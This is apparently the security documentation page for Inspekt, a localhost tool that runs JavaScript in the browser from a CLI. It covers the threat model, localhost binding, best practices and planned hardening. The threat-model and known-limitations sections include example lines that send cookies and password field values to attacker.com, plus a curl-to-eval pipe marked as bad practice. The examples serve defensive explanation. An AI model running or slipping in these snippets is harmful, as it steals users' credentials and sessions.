# Security

Security considerations, threat model, and best practices for Inspekt.

## Overview

Inspekt is a **local development tool** with a pragmatic security model designed for trusted development environments.

### Core Principles

1. **Localhost-only** - Server binds to `127.0.0.1` exclusively
2. **No remote access** - Not designed or hardened for internet exposure
3. **User trust model** - Users must trust JavaScript code they execute
4. **Browser security** - Relies on browser sandboxing and same-origin policy

## Threat Model

### In Scope

These threats are relevant and mitigated:

#### 1. Malicious JavaScript Execution

**Threat**: User executes untrusted JavaScript that steals data or performs unwanted actions.

**Impact**: High - Can steal cookies, make requests, modify DOM

**Mitigation**:

- ✅ Explicit user action required (no automatic execution)
- ✅ Scripts are visible before execution
- ✅ User can review code in terminal or files
- ✅ Browser sandbox provides isolation

**Example attack**:

```bash
# Attacker tricks user into running malicious script
inspekt eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
```

**Defense**: User education - only run trusted scripts

#### 2. Local Privilege Escalation

**Threat**: Malicious script escalates privileges on local machine.

**Impact**: Medium - Limited by browser sandbox

**Mitigation**:

- ✅ Browser sandbox isolates script execution
- ✅ Scripts cannot access filesystem directly
- ✅ Python server runs with user privileges (not elevated)
- ✅ No shell command execution from browser

#### 3. Configuration Tampering

**Threat**: Malicious process modifies `config.json` to enable harmful behavior.

**Impact**: Low - Configuration has minimal attack surface

**Mitigation**:

- ✅ No security-critical settings
- ✅ All communication is localhost-only
- ✅ File permissions follow OS defaults
- ✅ No automatic config reload

#### 4. Userscript Injection Attacks

**Threat**: Malicious website exploits userscript to execute code.

**Impact**: Medium - Limited to browser context

**Mitigation**:

- ✅ Userscript runs on all sites (`@match *://*/*`)
- ✅ Only executes code from authenticated WebSocket
- ✅ Only active tab processes commands
- ✅ Same-origin policy still applies

### Out of Scope

These threats are explicitly out of scope:

#### 1. Remote Attacks

**Not applicable**: Server never exposed to network by design.

- ✅ Localhost binding (`127.0.0.1`) prevents remote access
- ✅ No configuration option to bind to public IPs
- ✅ Firewall provides additional protection

#### 2. Network-Based Attacks

**Not applicable**: All communication is localhost-only.

- ✅ Traffic never leaves the machine
- ✅ No network interception possible
- ✅ OS kernel handles localhost communication

#### 3. Man-in-the-Middle Attacks

**Not applicable**: Localhost communication cannot be intercepted.

- ✅ Loopback interface is kernel-managed
- ✅ No external network involvement
- ✅ Local user with root can already compromise system

#### 4. Browser Vulnerabilities

**Separate concern**: Browser security is vendor responsibility.

- ✅ Inspekt relies on browser sandboxing
- ✅ No additional browser security bypass
- ✅ Keep browser updated (user responsibility)

## Security Features

### Network Security

#### Localhost Binding

Server **always** binds to `127.0.0.1`:

```python
# inspekt/bridge_ws.py
HOST = "127.0.0.1"  # Never binds to 0.0.0.0 or public IPs
PORT = 8765
```

**Guarantees**:

- ✅ No remote connections possible
- ✅ Only local processes can connect
- ✅ Protected by OS networking stack

!!! danger "Never Bind to 0.0.0.0"
    Modifying `HOST` to `0.0.0.0` or any public IP would expose your browser to **remote code execution**. This is extremely dangerous and defeats all security measures.

#### No Authentication Required

**Current status**: No authentication between CLI and server.

**Rationale**:

- ✅ Localhost-only reduces attack surface
- ✅ If machine is compromised, attacker has access anyway
- ✅ Simplifies development workflow
- ✅ User controls when server runs

**Future enhancement**: Optional token-based authentication for additional security.

#### No Encryption

WebSocket traffic is **unencrypted** (`ws://` instead of `wss://`).

**Why acceptable**:

- ✅ Traffic never leaves localhost
- ✅ OS kernel handles loopback communication
- ✅ Faster performance without TLS
- ✅ No certificate management needed

!!! warning
    If you modify HOST to bind to public IPs, traffic would be **unencrypted over the network**. This is unacceptable and dangerous.

### Code Execution Security

#### All Execution is Intentional

```bash
# User must explicitly run commands
inspekt eval "document.title"        # Explicit
inspekt exec script.js               # Explicit
inspekt extract-links                # Explicit

# No automatic execution on server start
inspekt server start  # Only starts server, no code execution
```

**Properties**:

- ✅ User must type command explicitly
- ✅ No background execution
- ✅ Clear audit trail in terminal
- ✅ Code visible before execution

#### User Must Install Userscript

**Installation steps**:

1. User downloads `userscript_ws.js`
2. User opens Tampermonkey/Violentmonkey
3. User creates new script
4. User pastes and saves
5. User can review code anytime
6. User can disable/uninstall anytime

**Properties**:

- ✅ Explicit installation required
- ✅ Code is visible and reviewable
- ✅ Can be disabled instantly
- ✅ User has full control

#### Scripts from Trusted Filesystem

Built-in scripts loaded from package installation:

```python
# inspekt/services/script_loader.py
script_path = Path(__file__).parent.parent / "scripts" / script_name
```

**Security considerations**:

- ✅ Scripts bundled with package
- ✅ Installed from trusted source (PyPI, GitHub)
- ✅ Cannot be modified without user action
- ✅ Standard file permissions apply

### Configuration Security

#### No Secrets Required

Configuration file contains **no sensitive data**:

```json
{
  "ai-language": "nl",
  "control": {
    "auto-refocus": "always",
    "speak-all": true,
    "verbose": true
  }
}
```

**Properties**:

- ✅ No API keys
- ✅ No passwords
- ✅ No tokens
- ✅ Safe to commit (if desired)

#### No Secrets in Logs

Server logs connection events only:

```
HTTP server running on http://127.0.0.1:8765
WebSocket connection opened (active: 1)
Request abc-123: pending
Request abc-123: completed (success)
```

**Properties**:

- ✅ No page content logged
- ✅ No sensitive data logged
- ✅ Request IDs are UUIDs (not predictable)
- ✅ Error messages sanitized

## Best Practices

### For Users

#### 1. Only Run Trusted JavaScript

```bash
# ✅ Good: Review script first
cat my_script.js
inspekt exec my_script.js

# ✅ Good: Understand inline code
inspekt eval "document.querySelectorAll('a').length"

# ❌ Bad: Run unknown script
curl https://untrusted.com/script.js | inspekt eval  # DON'T!
```

#### 2. Review Scripts Before Execution

Before running any script:

1. Read the JavaScript code completely
2. Understand what it does
3. Check for network requests
4. Look for data exfiltration
5. Test on non-sensitive pages first

#### 3. Don't Modify Server Binding

**Never change `HOST` in `bridge_ws.py`**:

```python
# ❌ DANGEROUS - Do NOT do this!
HOST = "0.0.0.0"           # Exposes to network
HOST = "192.168.1.100"     # Exposes to LAN
```

This would allow **remote code execution** in your browser.

#### 4. Keep Userscript Updated

```bash
# Check version
inspekt eval "window.__INSPEKT_BRIDGE_VERSION__"
# Current version: 3.4
```

Update when new versions are released for security fixes.

#### 5. Stop Server When Not in Use

```bash
# Stop when done
inspekt server stop

# Check status
inspekt server status
```

If server isn't running, attack surface is eliminated.

#### 6. Use Firewall (Defense in Depth)

Even with localhost binding, add firewall rules:

```bash
# macOS
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/python3
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --block /usr/local/bin/python3

# Linux (iptables)
sudo iptables -A INPUT -p tcp --dport 8765 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8765 -j DROP
```

### For Developers

#### 1. Validate All Inputs

```python
# ✅ Good: Validate with Pydantic
from inspekt.domain.models import RunRequest

data = await request.json()
validated = RunRequest(**data)  # Raises ValidationError if invalid

# ❌ Bad: No validation
data = await request.json()
code = data["code"]  # Could be missing or wrong type
```

#### 2. Sanitize Error Messages

```python
# ✅ Good: Generic error
return web.json_response(
    {"ok": False, "error": "Request failed"},
    status=500
)

# ❌ Bad: Leaks paths
return web.json_response(
    {"ok": False, "error": f"File not found: {user_path}"},
    status=500
)
```

#### 3. No Secrets in Code or Logs

```python
# ✅ Good: Don't log sensitive data
logger.info(f"Request {request_id} completed")

# ❌ Bad: Logs cookies
logger.info(f"Cookies: {cookies}")
```

#### 4. Follow Least Privilege

- Run server with user privileges (not root/admin)
- Don't request unnecessary browser permissions
- Limit userscript to minimum required
- Don't expose internal state unnecessarily

#### 5. Document Security Assumptions

When adding features:

- What security assumptions are made?
- What trust is required from user?
- What could go wrong if misused?
- What threat model applies?

## Known Limitations

### 1. Arbitrary JavaScript Execution

**By design**: Inspekt executes arbitrary JavaScript.

**Implications**:

- Can steal session cookies
- Can submit forms, make purchases
- Can read sensitive page content
- Can modify DOM, inject content
- Can make network requests

**Example attack**:

```javascript
// Steal all cookies
document.cookie.split(';').forEach(cookie => {
    fetch('https://attacker.com/steal?c=' + encodeURIComponent(cookie));
});

// Steal form data
document.querySelectorAll('input[type=password]').forEach(input => {
    fetch('https://attacker.com/steal?pwd=' + input.value);
});
```

**Defense**: Only run JavaScript you trust and understand.

### 2. No Authentication

**Current status**: Any local process can use bridge.

**Implications**:

- Local malware can execute JavaScript
- Other users on same machine can use bridge
- No audit of who executed what

**Acceptable because**:

- Localhost-only reduces exposure
- Compromised machine has bigger problems
- User controls when server runs

**Future enhancement**: Optional token authentication.

### 3. No Rate Limiting

**Current status**: No limits on request rate.

**Implications**:

- Buggy script can spam requests
- Could cause high CPU in browser
- Could cause memory buildup

**Acceptable because**:

- User controls both CLI and server
- Easy to stop server if needed
- Cleanup task removes old requests

**Future enhancement**: Optional rate limiting.

### 4. No Audit Logging

**Current status**: No persistent log of commands.

**Implications**:

- No history of what was executed
- Cannot review past actions
- Cannot detect suspicious activity

**Future enhancement**: Optional audit log.

## Vulnerability Reporting

### How to Report

If you discover a security vulnerability:

1. **Do NOT open public GitHub issue**
2. **Email maintainer directly** via GitHub profile
3. **Include [SECURITY] in subject**
4. **Provide**:
   - Description of vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

### Response Timeline

- **Initial response**: Within 48 hours
- **Assessment**: Within 1 week
- **Fix timeline**:
  - Critical: 1-7 days
  - High: 1-2 weeks
  - Medium: 2-4 weeks
  - Low: Best effort

### Responsible Disclosure

We follow responsible disclosure:

1. Report received and acknowledged
2. Vulnerability validated
3. Fix developed privately
4. Coordinated disclosure timeline
5. Public release with fix
6. Reporter credited (if desired)

## Future Enhancements

### 1. Optional Token Authentication

**Proposal**: Add optional authentication token.

```bash
# Server generates token on start
inspekt server start
# Server token: abc123xyz

# CLI uses token
inspekt eval "code" --token abc123xyz

# Or environment variable
export INSPEKT_BRIDGE_TOKEN=abc123xyz
inspekt eval "code"
```

**Benefits**:

- Prevents other local processes from using bridge
- Optional (disabled by default)
- Additional security layer

### 2. WebSocket Origin Validation

**Proposal**: Validate `Origin` header.

```python
async def websocket_handler(request):
    origin = request.headers.get('Origin', '')

    # Only accept browser extensions
    if not (origin.startswith('moz-extension://') or
            origin.startswith('chrome-extension://')):
        return web.Response(status=403)
```

**Benefits**:

- Prevents malicious websites from connecting
- Additional protection against local web attacks

### 3. Rate Limiting

**Proposal**: Add rate limiting to endpoints.

```python
# 100 requests per minute
rate_limiter = RateLimiter(requests=100, period=60)

async def handle_http_run(request):
    if not rate_limiter.allow():
        return web.json_response(
            {"ok": False, "error": "Rate limit exceeded"},
            status=429
        )
```

**Benefits**:

- Prevents accidental DoS
- Limits impact of malicious processes
- Protects browser from excessive execution

### 4. Audit Logging

**Proposal**: Optional command history log.

```bash
# Enable
inspekt config set audit.enabled true

# Log format
[2025-10-27 10:30:45] EVAL "document.title" -> "Example"
[2025-10-27 10:31:12] EXEC script.js -> OK
```

**Benefits**:

- Review command history
- Detect suspicious activity
- Debugging aid

### 5. Content Security Policy Awareness

**Proposal**: Detect and warn about CSP.

```bash
inspekt eval "fetch('https://api.example.com')"
# Warning: Page has CSP that may block fetch
# CSP: default-src 'self'
```

**Benefits**:

- Better UX (explain failures)
- Security awareness
- Debugging aid

## Security Checklist

### For New Features

Before merging:

- [ ] **Network binding**: Binds to `127.0.0.1` only?
- [ ] **Code execution**: Requires explicit user action?
- [ ] **Logging**: No sensitive data logged?
- [ ] **Input validation**: All inputs validated?
- [ ] **Error handling**: Error messages sanitized?
- [ ] **Dependencies**: Dependencies audited?
- [ ] **Configuration**: No security-critical settings?
- [ ] **Documentation**: Security assumptions documented?

## Summary

Inspekt security model:

**Core Principles**:

1. Localhost-only (never network-exposed)
2. User trusts scripts they execute
3. No authentication (localhost trust model)
4. Browser provides security boundary

**Acceptable Risks**:

- Local processes can connect
- Arbitrary JavaScript execution (by design)
- No encryption for localhost traffic

**Unacceptable Risks**:

- Remote code execution (prevented by localhost binding)
- Automatic code execution (requires user action)
- Secret leakage (no secrets in config/logs)

**User Responsibility**:

- Only execute trusted JavaScript
- Keep userscript updated
- Review scripts before running
- Don't modify server to bind to public IPs

This security model is appropriate for a development tool on a trusted local machine. For production or high-security environments, consider additional measures from the Future Enhancements section.

## Resources

- [Architecture Guide](architecture.md) - System design
- [Contributing Guide](contributing.md) - Development workflow

For the complete security policy, see `SECURITY.md` in the project repository root.

---

**Stay secure and happy coding!**
